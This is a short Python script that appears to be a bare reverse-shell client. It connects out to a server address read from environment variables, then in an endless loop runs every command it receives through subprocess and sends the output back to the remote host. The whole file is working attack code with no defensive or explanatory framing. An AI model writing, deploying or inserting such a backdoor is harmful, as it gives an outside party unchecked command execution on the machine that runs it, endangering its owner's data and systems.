import socket
import subprocess
import os
from dotenv import load_dotenv

load_dotenv()

PORT = int(os.getenv("PORT"))
SERVER = os.getenv("SERVER_IP")
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect(ADDR)

print("here?")

while True:
    command = client.recv(1024).decode()
    output = subprocess.getoutput(command)
    client.send(output.encode())

client.close()
